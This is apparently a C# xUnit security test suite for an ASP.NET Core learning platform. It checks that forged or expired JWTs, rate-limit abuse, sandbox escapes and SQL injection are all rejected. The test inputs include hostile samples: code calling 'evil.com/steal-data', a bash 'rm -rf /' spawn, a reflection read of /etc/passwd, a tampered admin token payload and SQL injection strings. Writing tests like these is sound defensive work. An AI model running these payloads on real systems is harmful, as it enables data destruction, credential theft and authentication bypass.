using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using Xunit;

namespace Integration.Tests;

/// <summary>
/// Comprehensive security testing suite for the ASP.NET Core Learning Platform
/// Validates: Requirements 1.4, 11.5, 14.1, 14.4, 14.5
/// Task 20.4: Perform security testing
/// </summary>
public class SecurityTests : IAsyncLifetime
{
    private readonly HttpClient _client;
    private readonly string _baseUrl;

    public SecurityTests()
    {
        _baseUrl = Environment.GetEnvironmentVariable("API_GATEWAY_URL") ?? "http://localhost:5000";
        _client = new HttpClient
        {
            BaseAddress = new Uri(_baseUrl),
            Timeout = TimeSpan.FromSeconds(60)
        };
    }

    public Task InitializeAsync()
    {
        return Task.CompletedTask;
    }

    public Task DisposeAsync()
    {
        _client.Dispose();
        return Task.CompletedTask;
    }

    #region Authentication Bypass Tests

    [Fact]
    public async Task AuthenticationBypass_WithNoToken_Returns401()
    {
        // Arrange - Try to access protected endpoint without token
        
        // Act
        var response = await _client.GetAsync("/api/challenges");

        // Assert
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Fact]
    public async Task AuthenticationBypass_WithInvalidToken_Returns401()
    {
        // Arrange - Create a token with invalid signature
        var invalidToken = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.invalid_signature";
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", invalidToken);
        
        // Act
        var response = await _client.GetAsync("/api/challenges");

        // Assert
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Fact]
    public async Task AuthenticationBypass_WithExpiredToken_Returns401()
    {
        // Arrange - Create an expired token
        var expiredToken = CreateExpiredToken();
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", expiredToken);
        
        // Act
        var response = await _client.GetAsync("/api/challenges");

        // Assert
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Fact]
    public async Task AuthenticationBypass_WithManipulatedToken_Returns401()
    {
        // Arrange - Register and login to get a valid token
        var registerRequest = new
        {
            name = "SecurityTest",
            email = $"security.{Guid.NewGuid()}@test.com",
            password = "SecurePass123!"
        };
        
        var registerResponse = await _client.PostAsJsonAsync("/api/auth/register", registerRequest);
        var registerResult = await registerResponse.Content.ReadFromJsonAsync<JsonElement>();
        var validToken = registerResult.GetProperty("token").GetString();
        
        // Manipulate the token payload
        var parts = validToken!.Split('.');
        var manipulatedPayload = Convert.ToBase64String(Encoding.UTF8.GetBytes("{\"sub\":\"admin\",\"role\":\"admin\"}"));
        var manipulatedToken = $"{parts[0]}.{manipulatedPayload}.{parts[2]}";
        
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", manipulatedToken);
        
        // Act
        var response = await _client.GetAsync("/api/challenges");

        // Assert
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    #endregion

    #region Rate Limiting Tests

    [Fact]
    public async Task RateLimiting_ExceedingLimit_Returns429()
    {
        // Arrange - Register and login
        var registerRequest = new
        {
            name = "RateLimitTest",
            email = $"ratelimit.{Guid.NewGuid()}@test.com",
            password = "SecurePass123!"
        };
        
        var registerResponse = await _client.PostAsJsonAsync("/api/auth/register", registerRequest);
        var registerResult = await registerResponse.Content.ReadFromJsonAsync<JsonElement>();
        var token = registerResult.GetProperty("token").GetString();
        
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        
        // Act - Make 101 requests rapidly (limit is 100 per minute)
        var tasks = new List<Task<HttpResponseMessage>>();
        for (int i = 0; i < 101; i++)
        {
            tasks.Add(_client.GetAsync("/api/challenges"));
        }
        
        var responses = await Task.WhenAll(tasks);
        
        // Assert - At least one request should be rate limited
        var rateLimitedResponses = responses.Where(r => r.StatusCode == HttpStatusCode.TooManyRequests).ToList();
        Assert.NotEmpty(rateLimitedResponses);
        
        // Verify Retry-After header is present
        var rateLimitedResponse = rateLimitedResponses.First();
        Assert.True(rateLimitedResponse.Headers.Contains("Retry-After") || 
                    rateLimitedResponse.Headers.RetryAfter != null);
    }

    [Fact]
    public async Task RateLimiting_UnauthenticatedRequests_HasLowerLimit()
    {
        // Arrange - No authentication
        
        // Act - Make 11 requests rapidly (limit is 10 per minute for unauthenticated)
        var tasks = new List<Task<HttpResponseMessage>>();
        for (int i = 0; i < 11; i++)
        {
            tasks.Add(_client.GetAsync("/api/auth/login"));
        }
        
        var responses = await Task.WhenAll(tasks);
        
        // Assert - At least one request should be rate limited
        var rateLimitedResponses = responses.Where(r => r.StatusCode == HttpStatusCode.TooManyRequests).ToList();
        Assert.NotEmpty(rateLimitedResponses);
    }

    #endregion

    #region Code Injection Tests

    [Fact]
    public async Task CodeInjection_FileSystemAccess_IsBlocked()
    {
        // Arrange - Register and login
        var (token, userId) = await RegisterAndLogin("CodeInjectionTest1");
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        
        // Malicious code attempting file system access
        var maliciousCode = @"
using System;
using System.IO;

public class Program
{
    public static void Main()
    {
        var files = Directory.GetFiles(""/etc"");
        Console.WriteLine(string.Join("","", files));
    }
}";
        
        var executeRequest = new
        {
            code = maliciousCode,
            files = new[] { new { name = "Program.cs", content = maliciousCode } },
            entryPoint = "Program.cs"
        };
        
        // Act
        var response = await _client.PostAsJsonAsync("/api/code/execute", executeRequest);
        
        // Assert - Should be rejected with prohibited code error
        Assert.True(response.StatusCode == HttpStatusCode.BadRequest || 
                    response.StatusCode == (HttpStatusCode)422);
        
        var result = await response.Content.ReadFromJsonAsync<JsonElement>();
        var errorCode = result.GetProperty("error").GetProperty("code").GetString();
        Assert.Equal("PROHIBITED_CODE", errorCode);
    }

    [Fact]
    public async Task CodeInjection_NetworkAccess_IsBlocked()
    {
        // Arrange - Register and login
        var (token, userId) = await RegisterAndLogin("CodeInjectionTest2");
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        
        // Malicious code attempting network access
        var maliciousCode = @"
using System;
using System.Net.Http;

public class Program
{
    public static async Task Main()
    {
        var client = new HttpClient();
        var response = await client.GetStringAsync(""http://evil.com/steal-data"");
        Console.WriteLine(response);
    }
}";
        
        var executeRequest = new
        {
            code = maliciousCode,
            files = new[] { new { name = "Program.cs", content = maliciousCode } },
            entryPoint = "Program.cs"
        };
        
        // Act
        var response = await _client.PostAsJsonAsync("/api/code/execute", executeRequest);
        
        // Assert - Should be rejected with prohibited code error
        Assert.True(response.StatusCode == HttpStatusCode.BadRequest || 
                    response.StatusCode == (HttpStatusCode)422);
        
        var result = await response.Content.ReadFromJsonAsync<JsonElement>();
        var errorCode = result.GetProperty("error").GetProperty("code").GetString();
        Assert.Equal("PROHIBITED_CODE", errorCode);
    }

    [Fact]
    public async Task CodeInjection_ProcessSpawning_IsBlocked()
    {
        // Arrange - Register and login
        var (token, userId) = await RegisterAndLogin("CodeInjectionTest3");
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        
        // Malicious code attempting process spawning
        var maliciousCode = @"
using System;
using System.Diagnostics;

public class Program
{
    public static void Main()
    {
        var process = Process.Start(""bash"", ""-c 'rm -rf /'"");
        Console.WriteLine(""Process started"");
    }
}";
        
        var executeRequest = new
        {
            code = maliciousCode,
            files = new[] { new { name = "Program.cs", content = maliciousCode } },
            entryPoint = "Program.cs"
        };
        
        // Act
        var response = await _client.PostAsJsonAsync("/api/code/execute", executeRequest);
        
        // Assert - Should be rejected with prohibited code error
        Assert.True(response.StatusCode == HttpStatusCode.BadRequest || 
                    response.StatusCode == (HttpStatusCode)422);
        
        var result = await response.Content.ReadFromJsonAsync<JsonElement>();
        var errorCode = result.GetProperty("error").GetProperty("code").GetString();
        Assert.Equal("PROHIBITED_CODE", errorCode);
    }

    [Fact]
    public async Task CodeInjection_ReflectionAttack_IsBlocked()
    {
        // Arrange - Register and login
        var (token, userId) = await RegisterAndLogin("CodeInjectionTest4");
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        
        // Malicious code attempting reflection-based attacks
        var maliciousCode = @"
using System;
using System.Reflection;

public class Program
{
    public static void Main()
    {
        var assembly = Assembly.Load(""System.IO"");
        var fileType = assembly.GetType(""System.IO.File"");
        var method = fileType.GetMethod(""ReadAllText"");
        var result = method.Invoke(null, new object[] { ""/etc/passwd"" });
        Console.WriteLine(result);
    }
}";
        
        var executeRequest = new
        {
            code = maliciousCode,
            files = new[] { new { name = "Program.cs", content = maliciousCode } },
            entryPoint = "Program.cs"
        };
        
        // Act
        var response = await _client.PostAsJsonAsync("/api/code/execute", executeRequest);
        
        // Assert - Should be rejected or fail safely
        Assert.True(response.StatusCode == HttpStatusCode.BadRequest || 
                    response.StatusCode == (HttpStatusCode)422 ||
                    response.IsSuccessStatusCode);
        
        if (response.IsSuccessStatusCode)
        {
            // If it executes, it should fail due to container restrictions
            var result = await response.Content.ReadFromJsonAsync<JsonElement>();
            var jobId = result.GetProperty("jobId").GetString();
            
            // Wait for execution
            await Task.Delay(2000);
            
            var statusResponse = await _client.GetAsync($"/api/code/status/{jobId}");
            var statusResult = await statusResponse.Content.ReadFromJsonAsync<JsonElement>();
            var status = statusResult.GetProperty("status").GetString();
            
            // Should fail or timeout, not succeed
            Assert.NotEqual("Completed", status);
        }
    }

    #endregion

    #region Container Isolation Tests

    [Fact]
    public async Task ContainerIsolation_MemoryLimit_IsEnforced()
    {
        // Arrange - Register and login
        var (token, userId) = await RegisterAndLogin("ContainerTest1");
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        
        // Code that attempts to allocate excessive memory (> 512MB)
        var memoryHogCode = @"
using System;
using System.Collections.Generic;

public class Program
{
    public static void Main()
    {
        var list = new List<byte[]>();
        for (int i = 0; i < 1000; i++)
        {
            list.Add(new byte[1024 * 1024]); // 1MB per iteration
            Console.WriteLine($""Allocated {i + 1} MB"");
        }
    }
}";
        
        var executeRequest = new
        {
            code = memoryHogCode,
            files = new[] { new { name = "Program.cs", content = memoryHogCode } },
            entryPoint = "Program.cs"
        };
        
        // Act
        var response = await _client.PostAsJsonAsync("/api/code/execute", executeRequest);
        Assert.True(response.IsSuccessStatusCode);
        
        var result = await response.Content.ReadFromJsonAsync<JsonElement>();
        var jobId = result.GetProperty("jobId").GetString();
        
        // Wait for execution
        await Task.Delay(5000);
        
        var statusResponse = await _client.GetAsync($"/api/code/status/{jobId}");
        var statusResult = await statusResponse.Content.ReadFromJsonAsync<JsonElement>();
        var status = statusResult.GetProperty("status").GetString();
        
        // Assert - Should fail with memory exceeded
        Assert.Equal("MemoryExceeded", status);
    }

    [Fact]
    public async Task ContainerIsolation_TimeLimit_IsEnforced()
    {
        // Arrange - Register and login
        var (token, userId) = await RegisterAndLogin("ContainerTest2");
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        
        // Code that runs indefinitely
        var infiniteLoopCode = @"
using System;
using System.Threading;

public class Program
{
    public static void Main()
    {
        while (true)
        {
            Console.WriteLine(""Still running..."");
            Thread.Sleep(1000);
        }
    }
}";
        
        var executeRequest = new
        {
            code = infiniteLoopCode,
            files = new[] { new { name = "Program.cs", content = infiniteLoopCode } },
            entryPoint = "Program.cs"
        };
        
        // Act
        var response = await _client.PostAsJsonAsync("/api/code/execute", executeRequest);
        Assert.True(response.IsSuccessStatusCode);
        
        var result = await response.Content.ReadFromJsonAsync<JsonElement>();
        var jobId = result.GetProperty("jobId").GetString();
        
        // Wait for timeout (30 seconds + buffer)
        await Task.Delay(35000);
        
        var statusResponse = await _client.GetAsync($"/api/code/status/{jobId}");
        var statusResult = await statusResponse.Content.ReadFromJsonAsync<JsonElement>();
        var status = statusResult.GetProperty("status").GetString();
        
        // Assert - Should timeout
        Assert.Equal("Timeout", status);
    }

    #endregion

    #region SQL Injection Tests

    [Fact]
    public async Task SQLInjection_InLoginEmail_IsBlocked()
    {
        // Arrange - Attempt SQL injection in email field
        var loginRequest = new
        {
            email = "admin' OR '1'='1",
            password = "anything"
        };
        
        // Act
        var response = await _client.PostAsJsonAsync("/api/auth/login", loginRequest);
        
        // Assert - Should fail authentication, not execute SQL injection
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Fact]
    public async Task SQLInjection_InChallengeSearch_IsBlocked()
    {
        // Arrange - Register and login
        var (token, userId) = await RegisterAndLogin("SQLInjectionTest");
        _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        
        // Attempt SQL injection in query parameter
        var maliciousQuery = "'; DROP TABLE Challenges; --";
        
        // Act
        var response = await _client.GetAsync($"/api/challenges?search={Uri.EscapeDataString(maliciousQuery)}");
        
        // Assert - Should return normal response, not execute injection
        Assert.True(response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.BadRequest);
        
        // Verify challenges table still exists by making a normal request
        var verifyResponse = await _client.GetAsync("/api/challenges");
        Assert.True(verifyResponse.IsSuccessStatusCode);
    }

    #endregion

    #region Helper Methods

    private async Task<(string token, Guid userId)> RegisterAndLogin(string namePrefix)
    {
        var registerRequest = new
        {
            name = namePrefix,
            email = $"{namePrefix.ToLower()}.{Guid.NewGuid()}@test.com",
            password = "SecurePass123!"
        };
        
        var registerResponse = await _client.PostAsJsonAsync("/api/auth/register", registerRequest);
        var registerResult = await registerResponse.Content.ReadFromJsonAsync<JsonElement>();
        var token = registerResult.GetProperty("token").GetString()!;
        var userId = Guid.Parse(registerResult.GetProperty("userId").GetString()!);
        
        return (token, userId);
    }

    private string CreateExpiredToken()
    {
        var securityKey = new RsaSecurityKey(RSA.Create(2048));
        var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.RsaSha256);
        
        var claims = new[]
        {
            new Claim(JwtRegisteredClaimNames.Sub, Guid.NewGuid().ToString()),
            new Claim(JwtRegisteredClaimNames.Email, "expired@test.com"),
            new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
        };
        
        var token = new JwtSecurityToken(
            issuer: "test-issuer",
            audience: "test-audience",
            claims: claims,
            expires: DateTime.UtcNow.AddHours(-1), // Expired 1 hour ago
            signingCredentials: credentials
        );
        
        return new JwtSecurityTokenHandler().WriteToken(token);
    }

    #endregion
}